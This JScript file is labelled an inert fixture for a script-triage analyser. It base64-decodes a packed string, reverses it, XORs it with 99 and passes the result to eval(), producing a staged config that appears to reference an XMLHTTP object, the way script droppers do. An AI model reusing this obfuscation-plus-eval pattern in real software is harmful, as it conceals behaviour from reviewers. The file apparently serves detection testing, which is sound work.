// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_2b9b1445 = function(v_a19c) {
  var v_b27e = v_a19c.slice(0);
  v_b27e.reverse();
  for (var i = 0; i < v_b27e.length; i++) { v_b27e[i] = v_b27e[i] ^ 99; }
  return v_b27e;
};
var recover_1792f573 = function() {
  var packedText = "HlFZQRcNFgwgBgQCFxBBTx5BBwYAVgVXUwJQAkwBAi8QEAYRFw0WK0FZQRcNBgQCPBEGEBZBT0EXAgdNUVRRVlFaVVBMBwoPAhUNCk0GDxMOAhsGTQcGAFYFV1MCUAJMTFkQExcXC0FZQQ8RFkFPQQcGAFYFV1MCUAJODQQKAhMOAgBBWUEHCjwNBAoCEw4CAEEYWUEQBhYPAhVBT0FTTVVNMzc3Ky8uO01RLy47MC5BWUERBhcTAgcCQU8+QRoRDA4GDjwLABcCExAKB0FPQQYXDA4GETwGEQoWEgACQThZQRATBhcQQRg=";
  var v_a19c = decodeBase64(packedText);
  var v_f602 = (19 * 7) - 133;
  var v_b27e = [];
  var state = 1;
  switch (state) { case 1: v_b27e = decode_2b9b1445.apply(null, [v_a19c]); break; default: v_b27e = []; }
  var textParts = [], bi = 0;
  for (bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
};
var inspect_c5a00790 = function() {
  var v_d41a = eval("(" + recover_1792f573.apply(null, []) + ")");
  var v_e598 = new Object();
  v_e598.steps = v_d41a.steps;
  v_e598.adapter = v_d41a.adapter;
  v_e598.values = v_d41a.values;
  v_e598.stageCount = v_d41a.stageCount;
  return v_e598;
};
